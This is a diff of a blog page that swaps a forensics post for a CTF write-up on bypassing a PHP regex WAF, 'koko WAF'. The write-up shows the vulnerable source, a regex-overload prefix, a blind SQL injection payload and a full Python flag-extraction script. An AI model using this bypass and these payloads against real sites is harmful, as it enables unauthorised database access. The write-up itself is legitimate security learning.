@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2025/09/02/twaiq-bootcamp-ctf-2025-forensics/"/>
+    <link rel="canonical" href="http://example.com/2025/09/10/blackhat-mea-quals-2025-—-web-challenges/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,14 +133,14 @@
         
         <meta name="description" content="Try HARDER !">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Twaiq bootcamp ctf 2025 - Forensics">
-<meta property="og:url" content="http://example.com/2025/09/02/Twaiq-bootcamp-ctf-2025-Forensics/index.html">
+<meta property="og:title" content="BlackHat mea Quals 2025 — Web challenges">
+<meta property="og:url" content="http://example.com/2025/09/10/BlackHat-mea-Quals-2025-%E2%80%94-Web-challenges/index.html">
 <meta property="og:site_name" content="depe">
 <meta property="og:description" content="Try HARDER !">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
-<meta property="article:published_time" content="2025-09-02T01:36:50.000Z">
-<meta property="article:modified_time" content="2025-09-02T02:35:32.752Z">
+<meta property="article:published_time" content="2025-09-09T23:07:12.000Z">
+<meta property="article:modified_time" content="2025-09-10T00:06:40.835Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
@@ -155,7 +155,7 @@
     
     <title>
         
-            Twaiq bootcamp ctf 2025 - Forensics | Depe&#39;s Blog
+            BlackHat mea Quals 2025 — Web challenges | Depe&#39;s Blog
         
     </title>
 
@@ -344,7 +344,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Twaiq bootcamp ctf 2025 - Forensics</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">BlackHat mea Quals 2025 — Web challenges</h1>
 			</div>
 			
 		</div>
@@ -365,15 +365,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2025-09-02 03:36:50</span>
-        <span class="mobile">2025-09-02 03:36:50</span>
+        <span class="desktop">2025-09-10 01:07:12</span>
+        <span class="mobile">2025-09-10 01:07:12</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-09-02 04:35:32</span>
-            <span class="mobile">2025-09-02 04:35:32</span>
+            <span class="desktop">2025-09-10 02:06:40</span>
+            <span class="mobile">2025-09-10 02:06:40</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -400,45 +400,71 @@
 
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-			<p>Hi, I’m Depe.. and in this post we gonna go through the forensics challenges from the Twaiq Bootcamp CTF.<br>The challenges were honestly kinda basic &amp; trivial (at least for me) but since i had nothing better to do i thought why not.. also it was the perfect excuse to waste some time (i was not totally procrastinating studying a(tra)ctive directory 🤓)</p>
-<h1 id="Forensics-01"><a href="#Forensics-01" class="headerlink" title="Forensics 01"></a>Forensics 01</h1><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/09/02/Twaiq-bootcamp-ctf-2025-Forensics/f1.png"
-                      class="" title="Alt text"
-                >
+			<p>I recently participated in Blackhat mea ctf 2025 quals. These are the write-ups of the Web challenges that I solved. I hope you will learn something new.</p>
+<p>Happy Hacking!!</p>
+<h1 id="koko-WAF"><a href="#koko-WAF" class="headerlink" title="koko WAF"></a>koko WAF</h1><p>we were given the challenge files and the source code for the whole web application to analyze </p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ tree kokowaf-player </span><br><span class="line">kokowaf-player</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── init.db</span><br><span class="line">├── init.sh</span><br><span class="line">└── src</span><br><span class="line">    ├── db.php</span><br><span class="line">    ├── index.php</span><br><span class="line">    ├── profile.php</span><br><span class="line">    ├── register.php</span><br><span class="line">    └── waf.php</span><br></pre></td></tr></table></figure></div>
+<p>looking at <code>waf.php</code></p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sqli_regex</span> = [</span><br><span class="line">    <span class="string">&quot;/([&#x27;|\&quot;])+/s&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/(&amp;|\|)+/s&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/(or|and)+/is&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/(union|select|from)+/is&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/\/\*\*\//&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/\s/&quot;</span></span><br><span class="line">];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sqli_regex</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$sqli_regex</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$input</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>The WAF filters out specific SQL keywords and characters using <code>preg_match</code> function,<br>The regex translates to :</p>
+<ul>
+<li>No quotes ‘ or “</li>
+<li>No logical operators (or, and)</li>
+<li>No union, select, from</li>
+<li>No comments (&#x2F;**&#x2F;)</li>
+<li>No spaces</li>
+</ul>
+<p>Now looking at the relevant section from <code>index.php</code>:</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>= <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$username</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$error_message</span> = <span class="string">&quot;WAF Block - Invalid input detected&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows === <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: profile.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$error_message</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<h5 id="Key-points"><a href="#Key-points" class="headerlink" title="Key points:"></a>Key points:</h5><ul>
+<li>Passwords are stored as SHA1 hashes.</li>
+<li>Only the username field passes through the WAF check.</li>
+<li>SQL query is vulnerable because of string concatenation:</li>
+</ul>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure></div>
 
-<p>challenge description :</p>
-<p><code>the file came from an unknow source. Can you figure out who created it ?</code></p>
-<p>And this weird looking “ugly” windows image was given</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/2025/09/02/Twaiq-bootcamp-ctf-2025-Forensics/windows.jpg"
-                      class="" title="Alt text"
-                >
+<p>if somehow we manged bypass the WAF filter we can inject into <code>$username</code>….</p>
+<p>we burned almost 8 straight hours throwing every trick in the SQLi playbook at this waf filter — case toggling, encodings, comment injections, whitespace bypasses — you name it… </p>
+<p>Nothing worked… this WAF laughed at every trick we had up our sleeves… until we realized the real weakness wasnt in what it blocked..but in how it was getting blocked.</p>
+<p>my friend came acrros a writeup for a similar challenge from last year <a class="link"   target="_blank" rel="noopener" href="https://github.com/daffainfo/ctf-writeup/tree/ddb01203ac94c9fe998b91a1ac899a54ad25753b/2024/0xL4ugh%20CTF%202024/Simple%20WAF" >link here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+<p>Regex engines are:<br>Greedy → they scan large amounts of input inefficiently.<br>Vulnerable to catastrophic backtracking if given overly long payloads.</p>
+<p>So instead of sneaking around the regex, the soultion was to break the regex itself.</p>
+<p>If we somehow managed to bypass the WAF filter, we could inject into the <code>$username</code> field.  </p>
+<p>We spent nearly <strong>eight hours</strong> straight throwing every trick in the SQLi playbook at this filter — case toggling, encodings, comment injections, whitespace bypasses — you name it, we tried it. Nothing worked. This WAF laughed at every payload we had up our sleeves… until we realized the real weakness wasn’t in <em>what</em> it blocked, but in how it was getting blocked.  </p>
+<p>While digging around, my friend came across a <a class="link"   target="_blank" rel="noopener" href="https://github.com/daffainfo/ctf-writeup/tree/ddb01203ac94c9fe998b91a1ac899a54ad25753b/2024/0xL4ugh%20CTF%202024/Simple%20WAF" >similar challenge writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> from last year. That was the lightbulb moment.  </p>
+<p>The key insight is that <strong>regex engines aren’t parsers</strong> — they have their own quirks:  </p>
+<ul>
+<li><strong>Greedy</strong> → they try to consume as much input as possible.  </li>
+<li><strong>Vulnerable to catastrophic backtracking</strong> → overly long or repetitive inputs can overwhelm them, causing the pattern matching to fail or behave inconsistently.</li>
+</ul>
+<p>So instead of trying to sneak around the regex rules, the real solution was to <strong>break the regex itself</strong>.  </p>
+<p>We constructed a massive prefix before our injection payload:</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prefix = <span class="number">383838</span> * <span class="string">&#x27;&quot;&#x27;</span>     </span><br><span class="line">prefix += <span class="number">383838</span> * <span class="string">&#x27;or&#x27;</span>   </span><br><span class="line">prefix += <span class="number">383838</span> * <span class="string">&#x27;union&#x27;</span></span><br></pre></td></tr></table></figure></div>
 
-<h2 id="solution"><a href="#solution" class="headerlink" title="solution"></a><em>solution</em></h2><p>As hinted in the challenge description … the <code>source</code> word indicates  that there is something hidden in the meta-data</p>
-<h4 id="what-is-Metadata"><a href="#what-is-Metadata" class="headerlink" title="what is Metadata ?"></a>what is Metadata ?</h4><p>Quoted from NCEI<br><code>Metadata, or &quot;data about data&quot;, is structured information that describes, explains, or provides context for other data, making it easier to find, use, and manage. It includes details like an item&#39;s creation date, author, format, and purpose, serving as crucial documentation to understand the data&#39;s history, quality, and intended use</code> </p>
-
+<p>This effectively overloaded the regex engine. By the time it scanned through hundreds of thousands of characters, it failed to correctly detect the final malicious injection at the end of the string and provided a false (thus bypass the check in the code above in <code>waf.php</code>).</p>
+<p>after that we craft our blid bool-based SQLi injection payload and append it to the exploit and it will work</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or (if((select(flag)from(flags)) like (&#x27;</span>BHFlagY&#123;a<span class="operator">%</span><span class="string">&#x27;),1,2)=1)#</span></span><br></pre></td></tr></table></figure></div>
+<p>then we coded a script that retrive the flag character by character and checks everytime if it starts with the “privously” check flag and append to it.</p>
+<p>so our final exploit was :</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">prefix =  <span class="number">383838</span> * <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">prefix += <span class="number">383838</span> * <span class="string">&#x27;or&#x27;</span></span><br><span class="line">prefix += <span class="number">383838</span> * <span class="string">&quot;union&quot;</span></span><br><span class="line"></span><br><span class="line">now_flag = <span class="string">&quot;BHFlagY&#123;&quot;</span></span><br><span class="line">hex_char = <span class="string">&quot;abcdef0123456789&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    <span class="built_in">print</span>(now_flag)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> hex_char:</span><br><span class="line">        flag = now_flag + j</span><br><span class="line">        injection = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: prefix + <span class="string">&quot;&#x27;or(if((select(flag)from(flags))like(&#x27;&quot;</span> + flag + <span class="string">&quot;%&#x27;),1,2)=1)#&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;password&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;login-submit&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(<span class="string">&quot;https://home:5001&quot;</span>, data = injection, allow_redirects = <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">302</span>:</span><br><span class="line">            now_flag = flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>
 		</div>
 
 		
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> Twaiq bootcamp ctf 2025 - Forensics</li>
+        <li><strong>Title:</strong> BlackHat mea Quals 2025 — Web challenges</li>
         <li><strong>Author:</strong> Depe</li>
         <li><strong>Created at
-                :</strong> 2025-09-02 03:36:50</li>
+                :</strong> 2025-09-10 01:07:12</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-09-02 04:35:32
+                    :</strong> 2025-09-10 02:06:40
             </li>
         
         <li>
-            <strong>Link:</strong> https://depe.blog/2025/09/02/Twaiq-bootcamp-ctf-2025-Forensics/
+            <strong>Link:</strong> https://depe.blog/2025/09/10/BlackHat-mea-Quals-2025-—-Web-challenges/
         </li>
         <li>
             <strong>
@@ -463,23 +489,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2025/09/10/BlackHat-mea-Quals-2025-%E2%80%94-Web-challenges/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">BlackHat mea Quals 2025 — Web challenges</span>
-						<span class="post-nav-item">Prev posts</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/08/21/BlackHat-MEA-CTF-2022-%E2%80%94-Forensic-challenges/">
+				<a class="next" rel="next" href="/2025/09/02/Twaiq-bootcamp-ctf-2025-Forensics/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">BlackHat MEA CTF 2022 — Forensic Challenges</span>
+						<span class="post-nav-title-item truncate max-w-48">Twaiq bootcamp ctf 2025 - Forensics</span>
 						<span class="post-nav-item">Next posts</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -541,8 +555,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">On this page</div>
-		<div class="page-title">Twaiq bootcamp ctf 2025 - Forensics</div>
-		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics-01"><span class="nav-text">Forensics 01</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#solution"><span class="nav-text">solution</span></a></li></ol></li></ol>
+		<div class="page-title">BlackHat mea Quals 2025 — Web challenges</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#koko-WAF"><span class="nav-text">koko WAF</span></a></li></ol>
 
 	</div>
 </div>
